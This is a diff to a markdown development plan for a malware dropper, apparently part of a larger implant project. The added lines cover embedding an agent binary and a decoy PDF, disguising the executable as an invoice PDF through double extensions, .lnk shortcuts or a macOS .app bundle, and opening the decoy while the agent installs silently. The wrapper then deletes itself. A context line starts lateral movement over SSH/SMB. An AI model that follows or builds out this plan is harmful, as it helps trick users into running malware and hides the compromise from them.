@@ -34,10 +34,25 @@
 *Target: New propagation module, wrapper as dropper*
 
 ### 2A — Dropper / Social Engineering
+
+**Build-time embedding (all platforms)**
 - Embed agent binary inside the wrapper (already done via `agent_binary.h`)
-- Wrapper extracts to hidden path and executes
-- Wrapper can open a decoy document (PDF/image) to mask activity
-- **Wrapper self-deletes** after successful extraction + execution
+- Embed a decoy PDF/image as a second byte array (extend `bin2header.py` with a second input)
+- Embed a PDF file icon as a Windows `.ico` resource or macOS `.icns`
+
+**Disguise techniques — wrapper masquerades as a PDF document**
+
+| Technique | Platforms | Mechanism |
+|---|---|---|
+| **Double extension** | Windows | Name the wrapper `invoice.pdf.exe`. Windows Explorer hides known extensions by default → user sees `invoice.pdf` with a PDF icon (via `.rc` resource). Double-click runs the .exe. |
+| **Shortcut (.lnk)** | Windows | Create a Windows shortcut file `invoice.pdf.lnk` pointing to the real wrapper. .lnk extension is hidden by default → shows as `invoice.pdf` with a PDF icon. Built at compile-time via `IShellLink` or PowerShell. |
+| **.app bundle** | macOS | Package the wrapper inside `Invoice.pdf.app/Contents/MacOS/`. Set `CFBundleIconFile` to a PDF icon in `Info.plist`. Finder displays it with the PDF icon. |
+
+**Execution flow**
+- Wrapper extracts the decoy PDF to a user-visible location (`~/Downloads/invoice.pdf`)
+- Wrapper opens the decoy via `ShellExecuteW` (Win), `open` (macOS), or `xdg-open` (Linux)
+- User sees a real document on screen — agent installs silently in background
+- **Wrapper self-deletes** after successful extraction + execution (combined with Phase 4C self-delete of the agent)
 
 ### 2B — Lateral Movement (SSH/SMB)
 - ARP scan + port scan on target subnet
